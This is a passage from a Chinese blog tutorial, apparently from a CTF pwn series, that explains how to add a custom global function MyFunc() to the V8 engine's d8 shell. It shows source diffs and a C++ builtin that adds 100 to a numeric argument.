BLOG</a></p></li><li><p>对于第一种类型的出题方式，就需要对<code>v8</code>的源码进行魔改，这里需要理解一下<code>JavaScript</code>和<code>C++</code>，这样会更容易理解，不过现在有<code>AI</code>会方便许多。</p></li><li><p>对于<code>V8</code>的开发不熟悉的需要多花费一点时间去理解和尝试，这里就先从总体开始了解，如何修改<code>V8</code>的源码编译好的<code>d8</code>中新增加一个全局函数<code>MyFunc()</code>。这个<code>MyFunc()</code>函数的主要功能就是接收用户传入的参数（可以是<code>字符串的数字</code>、<code>浮点数</code>、<code>整数</code>），返回的是传入的参数加上<code>100</code>的结果，这个结果的数据类型默认为<code>整型或者是浮点型</code>。</p></li><li><p>接下来就先给出我修改源码后的<code>.diff</code>文件，根据上面初步了解了<code>.diff</code>文件，我们从<code>.diff</code>文件这边可以了解到开发<code>V8</code>流程的其中一小部分，也就是为<code>V8</code>增加一个全局函数。</p></li><li><p>接下来是我修改源码后使用<code>git diff &gt; my_changes.diff  </code>，从这里可以了解到我们增加一个全局函数需要对源码的什么位置进行修改，接下来说明一下，具体修改了哪些文件的代码</p><ul><li><code>path/to/v8/BUILD.bazel</code></li><li><code>path/to/v8/BUILD.gn </code></li><li><code>path/to/v8/src/builtins/builtins-definitions.h</code></li><li><code>path/to/v8/src/init/bootstrapper.cc</code></li><li><code>path/to/v8/src/compiler/turbofan-typer.cc</code></li><li><strong>注意：从<code>BUILD.bazel</code>和<code>BUILD.gn</code></strong>，我们可以了解到我们还新建了一个文件，该文件为<code>path/to/v8/src/builtins/builtins-myfunc.cc</code></li></ul></li><li><p>可以先尝试一下根据<code>.diff</code>文件不用<code>git</code>命令自己尝试修改源码，然后编译，成功添加<code>MyFunc()</code>这个全局函数。也可以根据后面的操作去尝试</p></li></ul><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/BUILD.bazel b/BUILD.bazel</span></span><br><span class="line"><span class="comment">index a3c2438a030..3cd7b9c1630 100644</span></span><br><span class="line"><span class="comment">--- a/BUILD.bazel</span></span><br><span class="line"><span class="comment">+++ b/BUILD.bazel</span></span><br><span class="line"><span class="meta">@@ -1367,6 +1367,7 @@</span> filegroup(</span><br><span class="line">         &quot;src/builtins/builtins-global.cc&quot;,</span><br><span class="line">         &quot;src/builtins/builtins-internal.cc&quot;,</span><br><span class="line">         &quot;src/builtins/builtins-json.cc&quot;,</span><br><span class="line"><span class="addition">+        &quot;src/builtins/builtins-myfunc.cc&quot;,</span></span><br><span class="line">         &quot;src/builtins/builtins-number.cc&quot;,</span><br><span class="line">         &quot;src/builtins/builtins-object.cc&quot;,</span><br><span class="line">         &quot;src/builtins/builtins-promise.h&quot;,</span><br><span class="line">         </span><br><span class="line">         </span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/BUILD.gn b/BUILD.gn</span></span><br><span class="line"><span class="comment">index ba32e344142..a4e9e463898 100644</span></span><br><span class="line"><span class="comment">--- a/BUILD.gn</span></span><br><span class="line"><span class="comment">+++ b/BUILD.gn</span></span><br><span class="line"><span class="meta">@@ -5289,6 +5289,7 @@</span> v8_source_set(&quot;v8_base_without_compiler&quot;) &#123;</span><br><span class="line">     &quot;src/builtins/builtins-internal.cc&quot;,</span><br><span class="line">     &quot;src/builtins/builtins-intl.cc&quot;,</span><br><span class="line">     &quot;src/builtins/builtins-json.cc&quot;,</span><br><span class="line"><span class="addition">+    &quot;src/builtins/builtins-myfunc.cc&quot;,</span></span><br><span class="line">     &quot;src/builtins/builtins-number.cc&quot;,</span><br><span class="line">     &quot;src/builtins/builtins-object.cc&quot;,</span><br><span class="line">     &quot;src/builtins/builtins-reflect.cc&quot;,</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index c163334d7db..15e4b42fea3 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -133,6 +133,7 @@</span> namespace internal &#123;</span><br><span class="line">   IF_TSAN(TFC, TSANRelaxedStore32IgnoreFP, TSANStore)                          \</span><br><span class="line">   IF_TSAN(TFC, TSANRelaxedStore32SaveFP, TSANStore)                            \</span><br><span class="line">   IF_TSAN(TFC, TSANRelaxedStore64IgnoreFP, TSANStore)                          \</span><br><span class="line"><span class="addition">+  CPP(MyFunc, kDontAdaptArgumentsSentinel)                                     \</span></span><br><span class="line">   IF_TSAN(TFC, TSANRelaxedStore64SaveFP, TSANStore)                            \</span><br><span class="line">   IF_TSAN(TFC, TSANSeqCstStore8IgnoreFP, TSANStore)                            \</span><br><span class="line">   IF_TSAN(TFC, TSANSeqCstStore8SaveFP, TSANStore)                              \</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/src/compiler/turbofan-typer.cc b/src/compiler/turbofan-typer.cc</span></span><br><span class="line"><span class="comment">index 1b09c0f020e..998f9555256 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/turbofan-typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/turbofan-typer.cc</span></span><br><span class="line"><span class="meta">@@ -1849,6 +1849,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">     return Type::NonInternal();</span><br><span class="line">   &#125;</span><br><span class="line">   switch (function.shared(t-&gt;broker()).builtin_id()) &#123;</span><br><span class="line"><span class="addition">+    case Builtin::kMyFunc:</span></span><br><span class="line"><span class="addition">+      return Type::Number();</span></span><br><span class="line">     case Builtin::kMathRandom:</span><br><span class="line">       return Type::PlainNumber();</span><br><span class="line">     case Builtin::kMathFloor:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index d285b4e7e42..1c273e0f332 100644</span></span><br><span class="line"><span class="comment">--- a/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -2276,6 +2276,10 @@</span> void Genesis::InitializeGlobal(DirectHandle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">   native_context()-&gt;set_security_token(*global_object);</span><br><span class="line"></span><br><span class="line">   Factory* factory = isolate_-&gt;factory();</span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  &#123;  // -- M y F u n c</span></span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, global_object, &quot;MyFunc&quot;, Builtin::kMyFunc, 1, kDontAdapt);</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"></span><br><span class="line">   &#123;  // -- C o n t e x t</span><br><span class="line">     DirectHandle&lt;Map&gt; meta_map(native_context()-&gt;meta_map(), isolate());</span><br><span class="line"><span class="meta">@@ -2768,6 +2772,7 @@</span> void Genesis::InitializeGlobal(DirectHandle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           DONT_ENUM);</span><br><span class="line">     native_context()-&gt;set_global_parse_int_fun(*parse_int_fun);</span><br><span class="line"></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     // Install Number constants</span><br><span class="line">     const double kMaxValue = 1.7976931348623157e+308;</span><br><span class="line">     const double kMinValue = 5e-324;</span><br><span class="line"><span class="meta">@@ -7253,5 +7258,7 @@</span> char* Bootstrapper::RestoreState(char* from) &#123;</span><br><span class="line"> // Called when the top-level V8 mutex is destroyed.</span><br><span class="line"> void Bootstrapper::FreeThreadResources() &#123; DCHECK(!IsActive()); &#125;</span><br><span class="line"></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> &#125;  // namespace internal</span><br><span class="line"> &#125;  // namespace v8</span><br></pre></td></tr></table></figure><ul><li>这里也给出参考博客中的<code>myfunc.cc</code>中的具体代码：</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/builtins/builtins-utils-inl.h&quot;</span></span></span><br><span class="line"><span class="keyword">namespace</span> v8 &#123;</span><br><span class="line"><span class="keyword">namespace</span> internal &#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">BUILTIN</span>(MyFunc) &#123;</span><br><span class="line">    <span class="function">HandleScope <span class="title">scope</span><span class="params">(isolate)</span></span>;</span><br><span class="line">    Handle&lt;Object&gt; value = args.<span class="built_in">atOrUndefined</span>(isolate, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断参数是否为基本类型</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">IsJSPrimitiveWrapper</span>(*value)) &#123;</span><br><span class="line">        value = <span class="built_in">handle</span>(<span class="built_in">Cast</span>&lt;JSPrimitiveWrapper&gt;(value)-&gt;<span class="built_in">value</span>(), isolate);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断参数是否为数字</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">IsNumber</span>(*value)) &#123;</span><br><span class="line">        <span class="built_in">THROW_NEW_ERROR_RETURN_FAILURE</span>(</span><br><span class="line">                isolate, <span class="built_in">NewTypeError</span>(MessageTemplate::kArgumentIsNotUndefinedOrInteger,</span><br><span class="line">                                      isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewStringFromAsciiChecked</span>(</span><br><span class="line">                                              <span class="string">&quot;My.Func&quot;</span>),</span><br><span class="line">                                      isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">Number_string</span>()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将Object转换为浮点数</span></span><br><span class="line">    <span class="type">double</span> <span class="type">const</span> value_number = Object::<span class="built_in">NumberValue</span>(*value);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> *isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewNumber</span>(value_number + <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>修改完编译后就可以得到我们自定义的一个全局函数</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250217195916950.png" alt="image-20250217195916950"></p><ul><li>我们就先来介绍一下添加全局函数要修改的这些文件</li></ul><h2 id="相关文件"><a class="markdownIt-Anchor" href="#相关文件"></a> 相关文件</h2><ul><li>下面均为<code>V8 version 13.5.0</code>的源码</li></ul><h3 id="buildbazel和buildgn"><a class="markdownIt-Anchor" href="#buildbazel和buildgn"></a> <a href="http://BUILD.xn--bazelBUILD-lh7q.gn">BUILD.bazel和BUILD.gn</a></h3><ul><li>用于定义如何构建、编译和链接 V8 项目的各个模块和文件。</li><li>也就是这些文件用于要构建、编译和链接的V8项目的源文件，所以我们在<code>src</code>中新建一个文件，这时我们就要将这个文件的路径写入，到这两个文件中，这样我们自定义的功能才能被编译</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250217213331952.png" alt="image-20250217213331952"></p><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250217213348299.png" alt="image-20250217213348299"></p><h3 id="builtins-definitionsh"><a class="markdownIt-Anchor" href="#builtins-definitionsh"></a> builtins-definitions.h</h3><ul><li><code>builtins-definitions.h</code>，文件：这个文件主要就是定义<code>JavaScript</code>的内置类型、方法与函数，包括基本类型，比如：<code>整数</code>、<code>浮点数</code>、<code>布尔值</code>、<code>数组</code>、<code>字符串</code>。</li><li>例如下面的代码定义了一些数组的操作：比如<code>ArrayPop</code>，就是对数组的操作。</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250217210529358.png" alt="image-20250217210529358"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 源码:488行-499行</span></span><br><span class="line">  <span class="comment">/* ES6 #sec-array.prototype.pop */</span>                                           \</span><br><span class="line">  <span class="built_in">CPP</span>(ArrayPop, kDontAdaptArgumentsSentinel)                                   \</span><br><span class="line">  <span class="built_in">TFJ</span>(ArrayPrototypePop, kDontAdaptArgumentsSentinel)                          \</span><br><span class="line">  <span class="comment">/* ES6 #sec-array.prototype.push */</span>                                          \</span><br><span class="line">  <span class="built_in">CPP</span>(ArrayPush, kDontAdaptArgumentsSentinel)                                  \</span><br><span class="line">  <span class="built_in">TFJ</span>(ArrayPrototypePush, kDontAdaptArgumentsSentinel)                         \</span><br><span class="line">  <span class="comment">/* ES6 #sec-array.prototype.shift */</span>                                         \</span><br><span class="line">  <span class="built_in">CPP</span>(ArrayShift, kDontAdaptArgumentsSentinel)                                 \</span><br><span class="line">  <span class="comment">/* ES6 #sec-array.prototype.unshift */</span>                                       \</span><br><span class="line">  <span class="built_in">CPP</span>(ArrayUnshift, kDontAdaptArgumentsSentinel)                               \</span><br><span class="line">  <span class="comment">/* Support for Array.from and other array-copying idioms */</span>                  \</span><br><span class="line">  <span class="built_in">TFS</span>(CloneFastJSArray, NeedsContext::kYes, kSource)                           \</span><br></pre></td></tr></table></figure><ul><li>在源码中有<code>CPP</code>、<code>TFJ</code>、<code>TFS</code>这三个宏定义，还有<code>ASM()</code>等宏定义。接下来简单介绍一下前三个宏定义。<strong>我们编写内置函数是使用CPP编写，编写其具体功能</strong>。</li><li>而<code>CPP</code>、<code>TFJ</code>、<code>TFS</code>这三个宏定义主要决定的是这个函数使用的是<code>编译执行</code>还是<code>解释执行</code>，他们是决定了内建函数如何在 V8 引擎内部执行（编译执行、解释执行、JIT 优化、辅助优化等）</li><li>然后介绍一下这个文件中的相关参数：<ul><li><p><code>CPP</code>宏定义中的相关参数：</p><ul><li><code>ArrayPop</code>：</li><li><code>kDontAdaptArgumentsSentinel</code>：</li></ul></li><li><p><code>TFJ</code>宏定义相关参数：</p><ul><li><code>ArrayPrototypePush</code>：</li><li><code>kDontAdaptArgumentsSentinel</code>：</li></ul></li><li><p><code>TFS</code>宏定义相关参数：</p><ul><li><code>CloneFastJSArray</code>：</li><li><code>NeedsContext::kYes</code>：</li><li><code>kSource</code>：</li></ul></li></ul></li></ul><h3 id="bootstrappercc"><a class="markdownIt-Anchor" href="#bootstrappercc"></a> <a href="http://bootstrapper.cc">bootstrapper.cc</a></h3><ul><li>初始化和引导 V8 引擎的运行。它是 V8 启动过程中的核心部分之一，负责执行引擎的初始化和配置工作。</li><li>在这里我们就分析一个比较重要的方法：我们从源码可以看到这个方法从<code>2269</code>行到<code>5051</code>行，占这个文件非常大一部分。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Genesis::InitializeGlobal</span><span class="params">(DirectHandle&lt;JSGlobalObject&gt; global_object,</span></span></span><br><span class="line"><span class="params"><span class="function">                               DirectHandle&lt;JSFunction&gt; empty_function)</span></span></span><br></pre></td></tr></table></figure><ul><li>我们对数组一些操作的实现，会这这个方法中的里面进行初始化的配置，这样一些名称等都会被初始化，我们才能通过像这样<code>arr.pop()</code>关键字方法使用该功能，这边的<code>&#123;&#125;</code>并不代表函数，只是将一些列操作或者方法给集合在一起，这样就更方便查找。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;    </span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;findIndex&quot;</span>,</span><br><span class="line">                          Builtin::kArrayPrototypeFindIndex, <span class="number">1</span>, kDontAdapt);</span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;findLast&quot;</span>,</span><br><span class="line">                          Builtin::kArrayPrototypeFindLast, <span class="number">1</span>, kDontAdapt);</span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;findLastIndex&quot;</span>,</span><br><span class="line">                          Builtin::kArrayPrototypeFindLastIndex, <span class="number">1</span>, kDontAdapt);</span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;lastIndexOf&quot;</span>,</span><br><span class="line">                          Builtin::kArrayPrototypeLastIndexOf, <span class="number">1</span>, kDontAdapt);</span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;pop&quot;</span>, Builtin::kArrayPrototypePop,</span><br><span class="line">                          <span class="number">0</span>, kDontAdapt);</span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;push&quot;</span>, Builtin::kArrayPrototypePush,</span><br><span class="line">                          <span class="number">1</span>, kDontAdapt);</span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;reverse&quot;</span>,</span><br><span class="line">                          Builtin::kArrayPrototypeReverse, <span class="number">0</span>, kDontAdapt);</span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;shift&quot;</span>,</span><br><span class="line">                          Builtin::kArrayPrototypeShift, <span class="number">0</span>, kDontAdapt);</span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;unshift&quot;</span>,</span><br><span class="line">                          Builtin::kArrayPrototypeUnshift, <span class="number">1</span>, kDontAdapt);</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>接下来介绍一下<code>SimpleInstallFunction</code>相关参数的具体含义：<ul><li><code>isolate_</code>：</li><li><code>proto</code>：</li><li><code>&quot;findIndex&quot;</code>：</li><li><code>Builtin::kArrayPrototypeFindLastIndex</code>：</li><li><code>kDontAdapt</code>：</li></ul></li></ul><h3 id="turbofan-typercc"><a class="markdownIt-Anchor" href="#turbofan-typercc"></a> <a href="http://turbofan-typer.cc">turbofan-typer.cc</a></h3><ul><li><p>这里简单介绍一下<code>turbofan</code>，<code>turbofan</code>是一个编译器，可以将字节码编译为CPU可以直接执行的机器码。</p></li><li><p>这个文件算是一个编译器优化，就添加如下形式就行：</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第1851行</span></span><br><span class="line"><span class="keyword">switch</span> (function.<span class="built_in">shared</span>(t-&gt;<span class="built_in">broker</span>()).<span class="built_in">builtin_id</span>()) &#123;</span><br><span class="line"><span class="comment">// 在上面这个switch中添加下面内容:</span></span><br><span class="line"><span class="keyword">case</span> Builtin::kMyFunc:</span><br><span class="line">    <span class="keyword">return</span> Type::<span class="built_in">Number</span>();</span><br></pre></td></tr></table></figure><ul><li>接下来介绍一下具体这个函数的具体含义：<ul><li><code>function.shared(t-&gt;broker()).builtin_id()</code>：</li><li><code>Builtin::kMyFunc</code>：</li><li><code>Type::Number()</code>：</li></ul></li></ul><h2 id="添加myfunc全局函数"><a class="markdownIt-Anchor" href="#添加myfunc全局函数"></a> 添加MyFunc()全局函数</h2><h3 id="新建全局函数文件"><a class="markdownIt-Anchor" href="#新建全局函数文件"></a> 新建全局函数文件</h3><ul><li>在创建全局函数的时候我们会在这个文件目录下创建这样的文件<code>src/builtins/builtins-xxx.cc</code>，这里面编写的就是这个函数具体实现的功能</li><li>所以我们就先创建一个<code>src/builtins/builtins-myfunc.cc</code>文件，在文件中写入如下代码</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/builtins/builtins-utils-inl.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> v8 &#123;</span><br><span class="line"><span class="keyword">namespace</span> internal &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">BUILTIN</span>(MyFunc) &#123;</span><br><span class="line">        <span class="function">HandleScope <span class="title">scope</span><span class="params">(isolate)</span></span>;</span><br><span class="line">        Handle&lt;Object&gt; value = args.<span class="built_in">atOrUndefined</span>(isolate, <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 判断参数是否为基本类型</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">IsJSPrimitiveWrapper</span>(*value)) &#123;</span><br><span class="line">            value = <span class="built_in">handle</span>(<span class="built_in">Cast</span>&lt;JSPrimitiveWrapper&gt;(value)-&gt;<span class="built_in">value</span>(), isolate);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 判断参数是否为数字</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">IsNumber</span>(*value)) &#123;</span><br><span class="line">            <span class="built_in">THROW_NEW_ERROR_RETURN_FAILURE</span>(</span><br><span class="line">                    isolate, <span class="built_in">NewTypeError</span>(MessageTemplate::kArgumentIsNotUndefinedOrInteger,</span><br><span class="line">                                          isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewStringFromAsciiChecked</span>(</span><br><span class="line">                                                  <span class="string">&quot;My.Func&quot;</span>),</span><br><span class="line">                                          isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">Number_string</span>()));</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 将Object转换为浮点数</span></span><br><span class="line">        <span class="type">double</span> <span class="type">const</span> value_number = Object::<span class="built_in">NumberValue</span>(*value);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> *isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewNumber</span>(value_number + <span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="添加源文件"><a class="markdownIt-Anchor" href="#添加源文件"></a> 添加源文件</h3><ul><li>然后我们在<code>BUILD.bazel</code>和<code>BUILD.gn</code>这两个文件中添加我们新建的文件，如果是在开发中最好是按照顺序添加，这样会保证顺序不会乱</li></ul><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//BUILD.bazel</span><br><span class="line"><span class="meta">@@ -1367,6 +1367,7 @@</span> filegroup(</span><br><span class="line">         &quot;src/builtins/builtins-global.cc&quot;,</span><br><span class="line">         &quot;src/builtins/builtins-internal.cc&quot;,</span><br><span class="line">         &quot;src/builtins/builtins-json.cc&quot;,</span><br><span class="line"><span class="addition">+        &quot;src/builtins/builtins-myfunc.cc&quot;,</span></span><br><span class="line">         &quot;src/builtins/builtins-number.cc&quot;,</span><br><span class="line">         &quot;src/builtins/builtins-object.cc&quot;,</span><br><span class="line">         &quot;src/builtins/builtins-promise.h&quot;,</span><br><span class="line">BUILD.gn</span><br><span class="line">// </span><br><span class="line"><span class="meta">@@ -5289,6 +5289,7 @@</span> v8_source_set(&quot;v8_base_without_compiler&quot;) &#123;</span><br><span class="line">     &quot;src/builtins/builtins-internal.cc&quot;,</span><br><span class="line">     &quot;src/builtins/builtins-intl.cc&quot;,</span><br><span class="line">     &quot;src/builtins/builtins-json.cc&quot;,</span><br><span class="line"><span class="addition">+    &quot;src/builtins/builtins-myfunc.cc&quot;,</span></span><br><span class="line">     &quot;src/builtins/builtins-number.cc&quot;,</span><br><span class="line">     &quot;src/builtins/builtins-object.cc&quot;,</span><br><span class="line">     &quot;src/builtins/builtins-reflect.cc&quot;,</span><br></pre></td></tr></table></figure><ul><li>然后在这个文件<code>builtins-definitions.h</code>中添加</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CPP</span>(MyFunc, kDontAdaptArgumentsSentinel)      </span><br></pre></td></tr></table></figure><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250217222825643.png" alt="image-20250217222825643"></p><h3 id="初始化函数"><a class="markdownIt-Anchor" href="#初始化函数"></a> 初始化函数</h3><ul><li>然后在这个文件中<code>bootstrapper.cc</code>，添加如下代码，注意这边需要在</li></ul><figure class="highlight 